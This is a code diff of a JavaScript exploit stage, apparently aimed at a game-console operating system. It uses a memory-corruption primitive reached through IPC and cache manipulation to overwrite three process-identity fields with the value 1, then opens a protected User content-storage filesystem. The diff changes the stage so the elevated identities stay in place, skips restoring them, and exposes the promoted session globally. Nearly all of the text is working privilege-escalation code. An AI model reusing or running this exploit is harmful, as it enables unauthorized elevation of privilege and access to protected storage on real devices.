@@ -1,4 +1,4 @@
-import coreRuntime, {waitMs} from "./runtime.mjs";
+import coreRuntime from "./runtime.mjs";
 
 const {
   AnalysisBytes,
@@ -14,12 +14,62 @@ const {
   ipcStorageRead,
   ipcStorageWrite,
   log,
+  prepPacket,
   read8,
   readDomainObjects,
+  sendIPC,
   sendDomainCmd,
   write32,
   write8
 } = coreRuntime;
+
+// -- Entry point: orchestrate promotion and retain the verified session ------
+
+export async function runPromotionStep(input) {
+  const {config, addressPlan, addressReadVerified, candidateHandle,
+      domainSession, helpers, rootStageVerified,
+      verifiedIdentityTargets} = input;
+  let addressCopy = input.addressCopy;
+  let promotionAttempted = false;
+  let promotionOutcome = null;
+  let promotionRestored = true;
+  let workerStateSafe = input.workerStateSafe;
+    // S20: Promote verified PID fields and test User content-storage access.
+    // Retain the session and candidate handle only when the test succeeds.
+    if (addressReadVerified && rootStageVerified && verifiedIdentityTargets &&
+        domainSession && candidateHandle && addressPlan) {
+        promotionAttempted = true;
+        promotionOutcome = await runPromotionAndUserStorageProbe({
+            config, addressPlan, addressCopy, domainSession, candidateHandle,
+            helpers, verifiedIdentityTargets,
+            savedHandle: input.savedHandle,
+            onElevated: input.onElevated,
+            readFsAddressBytes: helpers.readFsAddressBytes
+        });
+        addressCopy = promotionOutcome.addressCopy || addressCopy;
+        if (addressCopy && addressCopy.workerStateSafe === false)
+            workerStateSafe = false;
+        promotionRestored = !!promotionOutcome.restored;
+        if (!promotionRestored &&
+            !promotionOutcome?.promotionRetained &&
+            !promotionOutcome?.promoted) {
+            workerStateSafe = false;
+            await log("PROMOTION: restoration could not be proven; skipping cache, " +
+                "save, and handle cleanup for restart recovery");
+        }
+    } else {
+        await log("PROMOTION: skipped; fresh identity proof, address read, or " +
+            "retained domain session is unavailable");
+    }
+
+  return {promotionAttempted, promotionOutcome, promotionRestored,
+      promotionRetained: !!promotionOutcome?.promotionRetained,
+      addressCopy, workerStateSafe,
+      downstreamCompleted: !!promotionOutcome?.downstreamCompleted,
+      retireRetainedEndpoint: promotionOutcome &&
+          promotionOutcome.retireRetainedEndpoint};
+}
+
 export async function runPromotionAndUserStorageProbe(input) {
     const {config, addressPlan, domainSession, candidateHandle, helpers,
         verifiedIdentityTargets, readFsAddressBytes} = input;
@@ -29,9 +79,11 @@ export async function runPromotionAndUserStorageProbe(input) {
     let retainedEndpoint = null;
     let retainedSetupStarted = false;
     let retainedEndpointReady = false;
-var outcome = {promoted: false, openedUserFs: false,
+    var outcome = {promoted: false, openedUserFs: false,
         listedUserRoot: false, restored: false, listCount: 0,
-        downstreamStarted: false, downstreamCompleted: false};
+        downstreamStarted: false, downstreamCompleted: false,
+        promotionRetained: false, contentFsHandleClosed: true,
+        contentFsDomainObjectClosed: true};
     var fields = verifiedIdentityTargets.fields;
     // readFsAddressBytes may prepend bytes from the start of its 0x28000
     // cache chunk even when the requested object is only 0x40–0x60 bytes.
@@ -39,7 +91,11 @@ var outcome = {promoted: false, openedUserFs: false,
     var readBuf = allocPage(config.ROOT_CAPTURE_CHUNK + 0x2000);
     var writeBuf = allocPage(0x1000);
     var contentFsHandle = 0;
+    var contentFsObjectIds = [];
     var downstreamSafeToRestore = true;
+    var promotedSessionRetained = false;
+
+    // -- Helper: read an identity object via cache or retained endpoint ------
 
     async function readObject(field, stage, plan) {
         if (retainedEndpointReady)
@@ -56,6 +112,8 @@ var outcome = {promoted: false, openedUserFs: false,
                 reply.error);
         return reply.bytes;
     }
+
+    // -- Helper: address-to-offset translation for writes --------------------
 
     function calculateWriteOffset(address, writePlan, stageName) {
         if (!writePlan || !writePlan.lowerWindow)
@@ -89,6 +147,8 @@ var outcome = {promoted: false, openedUserFs: false,
         return calculateWriteOffset(address, writePlan, stageName);
     }
 
+    // -- Helper: build and validate a target-specific cache plan -------------
+
     function buildTargetPlan(target, stageName) {
         var cycle = Number(addressPlan.cycle || config.ROOT_CAPTURE_CHUNK);
         var observedBlock = Math.floor(target / CONTROL_SIZE) *
@@ -110,6 +170,8 @@ var outcome = {promoted: false, openedUserFs: false,
         return plan;
     }
 
+    // -- Helper: install a cache plan via header copy ------------------------
+
     async function installPlan(plan, stageName) {
         if (activePlan === plan) return;
         if (!addressCopy || addressCopy.workerStateSafe === false)
@@ -129,6 +191,8 @@ var outcome = {promoted: false, openedUserFs: false,
         activePlan = plan;
     }
 
+    // -- Helper: read through the active cache mapping -----------------------
+
     async function readMappedMemory(address, length, stageName, plan) {
         var readPlan = plan || activePlan;
         if (!readPlan || readPlan !== activePlan)
@@ -140,6 +204,8 @@ var outcome = {promoted: false, openedUserFs: false,
             throw new Error(stageName + " read failed: " + reply.error);
         return reply.bytes;
     }
+
+    // -- Byte-level primitives -----------------------------------------------
 
     function u64Bytes(value) {
         var bytes = new Array(8);
@@ -198,6 +264,8 @@ var outcome = {promoted: false, openedUserFs: false,
         return true;
     }
 
+    // -- Logical IStorage I/O (raw offset-based) -----------------------------
+
     async function logicalRead(offset, length, stageName) {
         if (!Number.isSafeInteger(offset) || offset < 0 || length <= 0 ||
             length > 0x4000 || offset + length > addressPlan.storageSize)
@@ -247,6 +315,8 @@ var outcome = {promoted: false, openedUserFs: false,
         if (!AnalysisBytes.equal(observed, bytes))
             throw new Error(stageName + " readback differs");
     }
+
+    // -- Retained two-bucket endpoint ----------------------------------------
 
     async function controlRead(offset, length) {
         if (!retainedEndpoint || offset < 0 ||
@@ -372,6 +442,7 @@ var outcome = {promoted: false, openedUserFs: false,
             AnalysisBytes.readU64LE(layout.ownerBytes, 0x60) !== 14n)
             throw new Error("retained owner snapshot failed structural checks");
 
+
         var arrayPlan = buildTargetPlan(array, "retained cache array");
         retainedSetupStarted = true;
         await installPlan(arrayPlan, "cache-retained-array");
@@ -397,6 +468,7 @@ var outcome = {promoted: false, openedUserFs: false,
             await bootstrapWrite(array + 0x30, zeroBytes(0x5A0 - 0x30),
                 arrayPlan, "retained clear unused cache entries");
 
+        // Verify the data channel works by writing/reading a scratch marker.
         var marker = [0x52, 0x45, 0x54, 0x41, 0x49, 0x4E, 0x45, 0x44,
             0x00, 0xFF, 0x11, 0x22, 0xAA, 0x55, 0x99, 0x66];
         var secondMarker = [0x52, 0x45, 0x54, 0x41, 0x49, 0x4E, 0x45, 0x44,
@@ -422,6 +494,7 @@ var outcome = {promoted: false, openedUserFs: false,
                 originalScratch))
             throw new Error("retained scratch bytes were not restored");
 
+        // Retarget the data descriptor to the array itself for control access.
         await bootstrapWrite(array + dataEntryOffset + 0x20,
             u64Bytes(BigInt(array)), arrayPlan,
             "retained control descriptor retarget");
@@ -448,6 +521,8 @@ var outcome = {promoted: false, openedUserFs: false,
             dataEntryOffset, scratchOffset, pointer: array,
             ownerBefore: layout.ownerBytes.slice(), ready: false,
             canonical: true};
+
+        // Disable the owner's cache loop so no background iteration runs.
         await setRetainedPointer(owner);
         var ownerBefore = await logicalRead(dataOffset, 0x78,
             "retained owner precondition");
@@ -472,6 +547,7 @@ var outcome = {promoted: false, openedUserFs: false,
             AnalysisBytes.readU64LE(ownerAfter, 0x60) !== 14n)
             throw new Error("retained cache-loop count did not read back as zero");
 
+        // Final proof: scratch roundtrip after the cache loop is disabled.
         await setRetainedPointer(scratchAddress);
         if (!AnalysisBytes.equal(await logicalRead(dataOffset, 16,
                 "retained post-disable scratch read"), originalScratch))
@@ -498,8 +574,20 @@ var outcome = {promoted: false, openedUserFs: false,
     async function retireRetainedEndpoint() {
         var state = retainedEndpoint;
         if (!retainedEndpointReady || !state || !state.canonical ||
-            state.retired || !outcome.restored)
-            throw new Error("retained endpoint is not in a fully restored state");
+            state.retired || (!outcome.restored && !outcome.promoted))
+            throw new Error("retained endpoint is not in a verified state");
+
+        if (!outcome.restored) {
+            for (const field of fields) {
+                var currentIdentity = await readObject(field,
+                    "retained endpoint pre-retirement identity check");
+                if (!field.expectedPromotedBytes ||
+                    !AnalysisBytes.equal(currentIdentity,
+                        field.expectedPromotedBytes))
+                    throw new Error(field.name +
+                        " changed before endpoint retirement");
+            }
+        }
 
         await setRetainedPointer(state.owner);
         var owner = await logicalRead(state.dataOffset, 0x78,
@@ -528,8 +616,7 @@ var outcome = {promoted: false, openedUserFs: false,
             !addressPlan || !addressPlan.lowerWindow)
             throw new Error("the verified root, candidate IStorage, or address plan is unavailable");
 
-        // Check all three exact snapshots again immediately before the first
-        // write. This is target freshness validation, not a permission test.
+        // -- Phase 1: Pre-write freshness validation -------------------------
         for (var i = 0; i < fields.length; i++) {
             var field = fields[i];
             if (!field.beforeBytes ||
@@ -559,6 +646,7 @@ var outcome = {promoted: false, openedUserFs: false,
         await log("PROMOTION: all 3 exact object snapshots are fresh; " +
             "no protected filesystem command has been attempted");
 
+        // -- Phase 2: Retained endpoint installation -------------------------
         await installRetainedEndpoint(verifiedIdentityTargets.retainedCache);
         for (var ei = 0; ei < fields.length; ei++) {
             var endpointField = fields[ei];
@@ -571,6 +659,7 @@ var outcome = {promoted: false, openedUserFs: false,
         }
         await log("PROMOTION: retained endpoint reread all three original objects exactly");
 
+        // -- Phase 3: PID promotion writes -----------------------------------
         for (var wi = 0; wi < fields.length; wi++) {
             var target = fields[wi];
             if (target.before === 1n) {
@@ -613,8 +702,7 @@ var outcome = {promoted: false, openedUserFs: false,
                 throw new Error(target.name + " write did not produce the exact expected object");
         }
 
-        // Require exact readback for root, NCA, and save before the single
-        // elevated command. No cmd-110 baseline is issued at the beginning.
+        // -- Phase 4: Post-write verification --------------------------------
         for (var vi = 0; vi < fields.length; vi++) {
             var verifiedField = fields[vi];
             var promotedRead = await readObject(verifiedField,
@@ -627,7 +715,7 @@ var outcome = {promoted: false, openedUserFs: false,
         }
         outcome.promoted = true;
         await log("PROMOTION: all three complete objects verified with PID=1");
-
+        // -- Phase 5: Open User content storage and list root ----------------
         var openPacket = allocPage(0x2000);
         var openReply = sendDomainCmd(domainSession.handle,
             domainSession.rootObj, 110, openPacket,
@@ -635,6 +723,9 @@ var outcome = {promoted: false, openedUserFs: false,
         outcome.openTransport = openReply.transport;
         outcome.openResult = openReply.result;
         outcome.openObjects = openReply.objCount;
+        var fsObjects = openReply.ok
+            ? readDomainObjects(openPacket, openReply.objCount, 0) : [];
+        contentFsObjectIds = fsObjects;
         await log("FINAL ACCESS: OpenContentStorageFileSystem(User=1) " +
             "transport=" + hex32(openReply.transport) +
             " result=" + hex32(openReply.result) +
@@ -643,8 +734,6 @@ var outcome = {promoted: false, openedUserFs: false,
             openReply.result !== 0 || openReply.objCount !== 1)
             throw new Error("final User content-storage open failed");
 
-        var fsObjects = readDomainObjects(openPacket,
-            openReply.objCount, 0);
         if (fsObjects.length !== 1 || !fsObjects[0])
             throw new Error("OpenContentStorageFileSystem returned no IFileSystem object");
         outcome.openedUserFs = true;
@@ -673,6 +762,14 @@ var outcome = {promoted: false, openedUserFs: false,
         if (listing.error !== 0)
             throw new Error("User content-storage root listing failed");
 
+        outcome.userStorageTestPassed = true;
+        globalThis.fspSrv = domainSession;
+        promotedSessionRetained = true;
+        outcome.promotionRetained = true;
+        await log("PROMOTION: User storage test passed; promoted session bound " +
+            "as globalThis.fspSrv");
+
+        // -- Phase 6: Run dependent stages while elevated --------------------
         if (typeof input.onElevated === "function") {
             outcome.downstreamStarted = true;
             downstreamSafeToRestore = false;
@@ -707,232 +804,252 @@ var outcome = {promoted: false, openedUserFs: false,
         outcome.error = error.message;
         await log("PROMOTION: failed: " + error.message);
     } finally {
+        // -- Cleanup: close User FS handle -----------------------------------
         if (contentFsHandle) {
-            var fsClose = Number(closeHandle(contentFsHandle)) >>> 0;
-            outcome.fsCloseResult = fsClose;
-            await log("FINAL ACCESS: close User content filesystem rc=" +
-                hex32(fsClose));
+            try {
+                var fsClose = Number(closeHandle(contentFsHandle)) >>> 0;
+                outcome.fsCloseResult = fsClose;
+                outcome.contentFsHandleClosed = fsClose === 0;
+                await log("FINAL ACCESS: close User content filesystem rc=" +
+                    hex32(fsClose));
+            } catch (error) {
+                outcome.contentFsHandleClosed = false;
+                outcome.contentFsHandleCloseError =
+                    String(error?.message || error);
+                await log("FINAL ACCESS: close User content filesystem failed: " +
+                    outcome.contentFsHandleCloseError);
+            }
             contentFsHandle = 0;
         }
 
-        var restoreOk = true;
-        var restoreFailureDetails = [];
-        if (retainedEndpointReady && !downstreamSafeToRestore) {
-            restoreOk = false;
-            restoreFailureDetails.push("dependent-stages-left-live-state-unverified");
-            addressCopy = {...addressCopy, workerStateSafe: false,
-                retainedEndpointUnsafe: true};
-            await log("RESTORE: downstream phase did not prove all service, Loader, " +
-                "and event state safe; preserve the retained endpoint for restart recovery");
-        } else if (retainedEndpointReady) {
-            var restoreStates = new Array(fields.length);
-            for (var ci = 0; ci < fields.length; ci++) {
-                var checkField = fields[ci];
-                try {
-                    var checkedBytes = await readObject(checkField,
-                        "retained restore check");
-                    if (AnalysisBytes.equal(checkedBytes,
-                            checkField.beforeBytes)) {
-                        restoreStates[ci] = "original";
-                        await log("RESTORE: " + checkField.name +
-                            " already equals its original full-object snapshot");
-                    } else if (checkField.expectedPromotedBytes &&
-                            AnalysisBytes.equal(checkedBytes,
-                                checkField.expectedPromotedBytes)) {
-                        restoreStates[ci] = "promoted";
-                        await log("RESTORE: " + checkField.name +
-                            " matches the exact promoted object; retained restoration is required");
-                    } else {
-                        restoreStates[ci] = "unknown";
+        outcome.contentFsObjectCloseResults = [];
+        for (const objectId of contentFsObjectIds) {
+            try {
+                const objectClose = closeDomainObject(domainSession.handle,
+                    objectId);
+                outcome.contentFsObjectCloseResults.push(objectClose);
+                if (objectClose !== 0)
+                    outcome.contentFsDomainObjectClosed = false;
+            } catch (error) {
+                outcome.contentFsDomainObjectClosed = false;
+                outcome.contentFsObjectCloseResults.push(
+                    String(error?.message || error));
+            }
+        }
+        if (outcome.contentFsObjectCloseResults.length)
+            await log("FINAL ACCESS: close User filesystem objects rc=" +
+                outcome.contentFsObjectCloseResults.map(value =>
+                    typeof value === "number" ? hex32(value) : value).join(","));
+        contentFsObjectIds = [];
+
+        if (promotedSessionRetained) {
+            addressCopy = {...addressCopy,
+                retainedEndpointActive: retainedEndpointReady};
+            outcome.restored = false;
+            outcome.promotionRetained = true;
+            outcome.retainedEndpointActive = retainedEndpointReady;
+            outcome.restoreFailureDetails = [];
+            await log("PROMOTION: original PID fields intentionally remain at 1");
+        } else if (outcome.promoted) {
+            addressCopy = {...addressCopy,
+                retainedEndpointActive: retainedEndpointReady};
+            outcome.restored = false;
+            outcome.promotionRetained = false;
+            outcome.pidsRemainPromoted = true;
+            outcome.retainedEndpointActive = retainedEndpointReady;
+            outcome.restoreFailureDetails = [];
+            await log("PROMOTION: User storage test did not pass; PID fields " +
+                "remain at 1 and handles will be closed");
+        } else {
+            // -- Cleanup: restore original PID values ----------------------------
+            var restoreOk = true;
+            var restoreFailureDetails = [];
+            if (retainedEndpointReady && !downstreamSafeToRestore) {
+                restoreOk = false;
+                restoreFailureDetails.push("dependent-stages-left-live-state-unverified");
+                addressCopy = {...addressCopy, workerStateSafe: false,
+                    retainedEndpointUnsafe: true};
+                await log("RESTORE: downstream phase did not prove all service, Loader, " +
+                    "and event state safe; preserve the retained endpoint for restart recovery");
+            } else if (retainedEndpointReady) {
+                var restoreStates = new Array(fields.length);
+                for (var ci = 0; ci < fields.length; ci++) {
+                    var checkField = fields[ci];
+                    try {
+                        var checkedBytes = await readObject(checkField,
+                            "retained restore check");
+                        if (AnalysisBytes.equal(checkedBytes,
+                                checkField.beforeBytes)) {
+                            restoreStates[ci] = "original";
+                            await log("RESTORE: " + checkField.name +
+                                " already equals its original full-object snapshot");
+                        } else if (checkField.expectedPromotedBytes &&
+                                AnalysisBytes.equal(checkedBytes,
+                                    checkField.expectedPromotedBytes)) {
+                            restoreStates[ci] = "promoted";
+                            await log("RESTORE: " + checkField.name +
+                                " matches the exact promoted object; retained restoration is required");
+                        } else {
+                            restoreStates[ci] = "unknown";
+                            restoreOk = false;
+                            restoreFailureDetails.push(checkField.name +
+                                ": changed-from-both-snapshots");
+                            await log("RESTORE: " + checkField.name +
+                                " differs from both snapshots; no blind write issued");
+                        }
+                    } catch (readError) {
+                        restoreStates[ci] = "unreadable";
                         restoreOk = false;
                         restoreFailureDetails.push(checkField.name +
-                            ": changed-from-both-snapshots");
+                            ": retained-read-failed: " + readError.message);
                         await log("RESTORE: " + checkField.name +
-                            " differs from both snapshots; no blind write issued");
+                            " unreadable through retained endpoint: " + readError.message);
                     }
-                } catch (readError) {
-                    restoreStates[ci] = "unreadable";
-                    restoreOk = false;
-                    restoreFailureDetails.push(checkField.name +
-                        ": retained-read-failed: " + readError.message);
-                    await log("RESTORE: " + checkField.name +
-                        " unreadable through retained endpoint: " + readError.message);
                 }
-            }
 
-            for (var ri = fields.length - 1; ri >= 0; ri--) {
-                var restoreField = fields[ri];
-                if (restoreStates[ri] !== "promoted") continue;
-                try {
-                    var currentForRestore = await readObject(restoreField,
-                        "retained restore target check");
-                    if (!restoreField.expectedPromotedBytes ||
-                        !AnalysisBytes.equal(currentForRestore,
-                            restoreField.expectedPromotedBytes)) {
+                for (var ri = fields.length - 1; ri >= 0; ri--) {
+                    var restoreField = fields[ri];
+                    if (restoreStates[ri] !== "promoted") continue;
+                    try {
+                        var currentForRestore = await readObject(restoreField,
+                            "retained restore target check");
+                        if (!restoreField.expectedPromotedBytes ||
+                            !AnalysisBytes.equal(currentForRestore,
+                                restoreField.expectedPromotedBytes)) {
+                            restoreOk = false;
+                            restoreFailureDetails.push(restoreField.name +
+                                ": changed-before-restore-write");
+                            await log("RESTORE: " + restoreField.name +
+                                " differs from the exact promoted snapshot; no write issued");
+                            continue;
+                        }
+                        await retainedWriteMemory(
+                            restoreField.object + restoreField.pidOffset,
+                            u64Bytes(restoreField.before),
+                            "retained PID restoration " + restoreField.name);
+                        var restoredBytes = await readObject(restoreField,
+                            "retained restore readback");
+                        var exactRestore = AnalysisBytes.equal(restoredBytes,
+                            restoreField.beforeBytes);
+                        await log("RESTORE: " + restoreField.name +
+                            " route=retained-two-bucket exactObject=" + exactRestore);
+                        if (!exactRestore) restoreOk = false;
+                        if (!exactRestore)
+                            restoreFailureDetails.push(restoreField.name +
+                                ": exact-object-readback-failed");
+                        if (exactRestore) restoreStates[ri] = "original";
+                    } catch (restoreError) {
                         restoreOk = false;
                         restoreFailureDetails.push(restoreField.name +
-                            ": changed-before-restore-write");
+                            ": restore-failed: " + restoreError.message);
                         await log("RESTORE: " + restoreField.name +
-                            " differs from the exact promoted snapshot; no write issued");
-                        continue;
+                            " failed: " + restoreError.message);
                     }
-                    await retainedWriteMemory(
-                        restoreField.object + restoreField.pidOffset,
-                        u64Bytes(restoreField.before),
-                        "retained PID restoration " + restoreField.name);
-                    var restoredBytes = await readObject(restoreField,
-                        "retained restore readback");
-                    var exactRestore = AnalysisBytes.equal(restoredBytes,
-                        restoreField.beforeBytes);
-                    await log("RESTORE: " + restoreField.name +
-                        " route=retained-two-bucket exactObject=" + exactRestore);
-                    if (!exactRestore) restoreOk = false;
-                    if (!exactRestore)
-                        restoreFailureDetails.push(restoreField.name +
-                            ": exact-object-readback-failed");
-                    if (exactRestore) restoreStates[ri] = "original";
-                } catch (restoreError) {
-                    restoreOk = false;
-                    restoreFailureDetails.push(restoreField.name +
-                        ": restore-failed: " + restoreError.message);
-                    await log("RESTORE: " + restoreField.name +
-                        " failed: " + restoreError.message);
                 }
-            }
 
-            for (var fi = 0; fi < fields.length; fi++) {
-                try {
-                    var finalBytes = await readObject(fields[fi],
-                        "final retained restore verification");
-                    var exact = AnalysisBytes.equal(finalBytes,
-                        fields[fi].beforeBytes);
-                    if (!exact) {
+                for (var fi = 0; fi < fields.length; fi++) {
+                    try {
+                        var finalBytes = await readObject(fields[fi],
+                            "final retained restore verification");
+                        var exact = AnalysisBytes.equal(finalBytes,
+                            fields[fi].beforeBytes);
+                        if (!exact) {
+                            restoreOk = false;
+                            restoreFailureDetails.push(fields[fi].name +
+                                ": final-object-verification-failed");
+                        }
+                        await log("RESTORE: final " + fields[fi].name +
+                            " exactOriginalObject=" + exact);
+                    } catch (finalReadError) {
                         restoreOk = false;
                         restoreFailureDetails.push(fields[fi].name +
-                            ": final-object-verification-failed");
+                            ": final-read-failed: " + finalReadError.message);
+                        await log("RESTORE: final " + fields[fi].name +
+                            " read failed: " + finalReadError.message);
                     }
-                    await log("RESTORE: final " + fields[fi].name +
-                        " exactOriginalObject=" + exact);
-                } catch (finalReadError) {
+                }
+                addressCopy = {...addressCopy, retainedEndpointActive: true};
+                await log("RESTORE: retained endpoint stays available until S21 cleanup " +
+                    "verifies retirement and closes the candidate storage handle");
+            } else {
+                if (retainedSetupStarted) {
                     restoreOk = false;
-                    restoreFailureDetails.push(fields[fi].name +
-                        ": final-read-failed: " + finalReadError.message);
-                    await log("RESTORE: final " + fields[fi].name +
-                        " read failed: " + finalReadError.message);
-                }
-            }
-            addressCopy = {...addressCopy, retainedEndpointActive: true};
-            await log("RESTORE: retained endpoint stays available until S21 cleanup " +
-                "verifies retirement and closes the candidate storage handle");
-        } else {
-            if (retainedSetupStarted) {
-                restoreOk = false;
-                restoreFailureDetails.push("retained-endpoint-setup-partial");
-                if (activePlan !== addressPlan &&
-                    addressCopy.workerStateSafe !== false) {
-                    try {
-                        await installPlan(addressPlan,
-                            "cache-retained-failure-inspection-window");
-                    } catch (planError) {
-                        await log("RESTORE: broad inspection mapping could not be reinstated: " +
-                            planError.message);
-                    }
-                }
-                if (activePlan === addressPlan) {
-                    for (var pi = 0; pi < fields.length; pi++) {
+                    restoreFailureDetails.push("retained-endpoint-setup-partial");
+                    if (activePlan !== addressPlan &&
+                        addressCopy.workerStateSafe !== false) {
                         try {
-                            var partialRead = await readObject(fields[pi],
-                                "retained setup failure inspection", addressPlan);
-                            await log("RESTORE: " + fields[pi].name +
-                                " PID snapshot=" +
-                                (AnalysisBytes.equal(partialRead,
-                                    fields[pi].beforeBytes) ? "original" :
-                                    "changed/unknown"));
-                        } catch (partialError) {
-                            await log("RESTORE: " + fields[pi].name +
-                                " inspection failed: " + partialError.message);
+                            await installPlan(addressPlan,
+                                "cache-retained-failure-inspection-window");
+                        } catch (planError) {
+                            await log("RESTORE: broad inspection mapping could not be reinstated: " +
+                                planError.message);
+                        }
+                    }
+                    if (activePlan === addressPlan) {
+                        for (var pi = 0; pi < fields.length; pi++) {
+                            try {
+                                var partialRead = await readObject(fields[pi],
+                                    "retained setup failure inspection", addressPlan);
+                                await log("RESTORE: " + fields[pi].name +
+                                    " PID snapshot=" +
+                                    (AnalysisBytes.equal(partialRead,
+                                        fields[pi].beforeBytes) ? "original" :
+                                        "changed/unknown"));
+                            } catch (partialError) {
+                                await log("RESTORE: " + fields[pi].name +
+                                    " inspection failed: " + partialError.message);
+                            }
+                        }
+                    }
+                    addressCopy = {...addressCopy,
+                        workerStateSafe: false,
+                        retainedEndpointUnsafe: true};
+                    await log("RESTORE: retained setup was partial; candidate retirement and save cleanup are unsafe");
+                } else {
+                    for (var oi = 0; oi < fields.length; oi++) {
+                        try {
+                            var originalRead = await readObject(fields[oi],
+                                "no-write failure inspection", addressPlan);
+                            var unchanged = AnalysisBytes.equal(originalRead,
+                                fields[oi].beforeBytes);
+                            if (!unchanged) restoreOk = false;
+                            if (!unchanged)
+                                restoreFailureDetails.push(fields[oi].name +
+                                    ": original-object-changed-before-promotion");
+                            await log("RESTORE: " + fields[oi].name +
+                                " exactOriginalObject=" + unchanged);
+                        } catch (originalError) {
+                            restoreOk = false;
+                            restoreFailureDetails.push(fields[oi].name +
+                                ": original-object-inspection-failed: " +
+                                originalError.message);
+                            await log("RESTORE: " + fields[oi].name +
+                                " inspection failed: " + originalError.message);
                         }
                     }
                 }
-                addressCopy = {...addressCopy,
-                    workerStateSafe: false,
-                    retainedEndpointUnsafe: true};
-                await log("RESTORE: retained setup was partial; candidate retirement and save cleanup are unsafe");
-            } else {
-                for (var oi = 0; oi < fields.length; oi++) {
-                    try {
-                        var originalRead = await readObject(fields[oi],
-                            "no-write failure inspection", addressPlan);
-                        var unchanged = AnalysisBytes.equal(originalRead,
-                            fields[oi].beforeBytes);
-                        if (!unchanged) restoreOk = false;
-                        if (!unchanged)
-                            restoreFailureDetails.push(fields[oi].name +
-                                ": original-object-changed-before-promotion");
-                        await log("RESTORE: " + fields[oi].name +
-                            " exactOriginalObject=" + unchanged);
-                    } catch (originalError) {
-                        restoreOk = false;
-                        restoreFailureDetails.push(fields[oi].name +
-                            ": original-object-inspection-failed: " +
-                            originalError.message);
-                        await log("RESTORE: " + fields[oi].name +
-                            " inspection failed: " + originalError.message);
-                    }
-                }
             }
-        }
-        outcome.restored = restoreOk;
-        outcome.restoreFailureDetails = restoreFailureDetails;
-        outcome.retainedEndpointActive = retainedEndpointReady;
+            outcome.restored = restoreOk;
+            outcome.restoreFailureDetails = restoreFailureDetails;
+            outcome.retainedEndpointActive = retainedEndpointReady;
         await log("RESTORE: PID result=" +
             (restoreOk ? "EXACT" : "FAILED; state is unsafe"));
+        }
     }
 
     outcome.addressCopy = addressCopy;
-    if (retainedEndpointReady && outcome.restored)
+    if (retainedEndpointReady && (outcome.restored ||
+            (outcome.promoted && !outcome.promotionRetained)))
         outcome.retireRetainedEndpoint = retireRetainedEndpoint;
     return outcome;
 }
 
-export async function runPromotionStep(input) {
-  const {config, addressPlan, addressReadVerified, candidateHandle,
-      domainSession, helpers, rootStageVerified,
-      verifiedIdentityTargets} = input;
-  let addressCopy = input.addressCopy;
-  let promotionAttempted = false;
-  let promotionOutcome = null;
-  let promotionRestored = true;
-  let workerStateSafe = input.workerStateSafe;
-    // S20: Promote the three freshly discovered PID fields, issue the one final
-    // User-content-storage read, and restore the original object bytes.
-    if (addressReadVerified && rootStageVerified && verifiedIdentityTargets &&
-        domainSession && candidateHandle && addressPlan) {
-        promotionAttempted = true;
-        promotionOutcome = await runPromotionAndUserStorageProbe({
-            config, addressPlan, addressCopy, domainSession, candidateHandle,
-            helpers, verifiedIdentityTargets,
-            savedHandle: input.savedHandle,
-            onElevated: input.onElevated,
-            readFsAddressBytes: helpers.readFsAddressBytes
-        });
-        addressCopy = promotionOutcome.addressCopy || addressCopy;
-        if (addressCopy && addressCopy.workerStateSafe === false)
-            workerStateSafe = false;
-        promotionRestored = !!promotionOutcome.restored;
-        if (!promotionRestored) {
-            workerStateSafe = false;
-            await log("PROMOTION: restoration could not be proven; skipping cache, " +
-                "save, and handle cleanup for restart recovery");
-        }
-    } else {
-        await log("PROMOTION: skipped; fresh identity proof, address read, or " +
-            "retained domain session is unavailable");
-    }
-
-  return {promotionAttempted, promotionOutcome, promotionRestored,
-      addressCopy, workerStateSafe,
-      downstreamCompleted: !!promotionOutcome?.downstreamCompleted,
-      retireRetainedEndpoint: promotionOutcome &&
-          promotionOutcome.retireRetainedEndpoint};
+function closeDomainObject(sessionHandle, objectId) {
+    if (!sessionHandle || !objectId) return 0xFFFFFFFF;
+    const packet = allocPage(0x2000);
+    prepPacket(packet, 4, 8, []);
+    write8(packet + 0x10n, 2n);
+    write32(packet + 0x14n, BigInt(objectId));
+    write32(packet + 0x1Cn, 0n);
+    return Number(sendIPC(sessionHandle, packet)) >>> 0;
 }
